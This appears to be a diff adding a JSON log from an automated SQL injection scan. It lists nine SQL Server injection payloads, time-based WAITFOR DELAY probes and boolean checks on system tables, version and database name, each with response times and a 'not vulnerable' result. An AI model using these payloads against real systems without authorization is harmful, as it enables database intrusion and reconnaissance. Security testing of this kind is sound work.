@@ -1,0 +1,74 @@
+[
+  {
+    "payload": "25.1)) WAITFOR DELAY '0:0:5' --",
+    "description": "Time-based - WAITFOR DELAY 5 sec",
+    "response_time": 1.4338619709014893,
+    "status_code": 200,
+    "vulnerable": false,
+    "reason": ""
+  },
+  {
+    "payload": "25.1)) WAITFOR DELAY '0:0:3' --",
+    "description": "Time-based - WAITFOR DELAY 3 sec",
+    "response_time": 1.4201242923736572,
+    "status_code": 200,
+    "vulnerable": false,
+    "reason": ""
+  },
+  {
+    "payload": "25.1)) WAITFOR DELAY '0:0:1' --",
+    "description": "Time-based - WAITFOR DELAY 1 sec",
+    "response_time": 1.3874411582946777,
+    "status_code": 200,
+    "vulnerable": false,
+    "reason": ""
+  },
+  {
+    "payload": "25.1)) AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)>0 --",
+    "description": "Boolean - INFORMATION_SCHEMA check",
+    "response_time": 1.3978073596954346,
+    "status_code": 200,
+    "vulnerable": false,
+    "reason": ""
+  },
+  {
+    "payload": "25.1)) AND (SELECT COUNT(*) FROM sysobjects WHERE xtype='U')>0 --",
+    "description": "Boolean - sysobjects check",
+    "response_time": 1.4291691780090332,
+    "status_code": 200,
+    "vulnerable": false,
+    "reason": ""
+  },
+  {
+    "payload": "25.1)) AND 1=1 --",
+    "description": "Boolean - True condition",
+    "response_time": 1.3997588157653809,
+    "status_code": 200,
+    "vulnerable": false,
+    "reason": ""
+  },
+  {
+    "payload": "25.1)) AND 1=2 --",
+    "description": "Boolean - False condition",
+    "response_time": 2.179755687713623,
+    "status_code": 200,
+    "vulnerable": false,
+    "reason": ""
+  },
+  {
+    "payload": "25.1)) AND (SELECT SUBSTRING(@@version,1,1))='M' --",
+    "description": "Boolean - Version check (Microsoft)",
+    "response_time": 1.3674328327178955,
+    "status_code": 200,
+    "vulnerable": false,
+    "reason": ""
+  },
+  {
+    "payload": "25.1)) AND LEN(DB_NAME())>3 --",
+    "description": "Boolean - Database name length",
+    "response_time": 2.2696890830993652,
+    "status_code": 200,
+    "vulnerable": false,
+    "reason": ""
+  }
+]
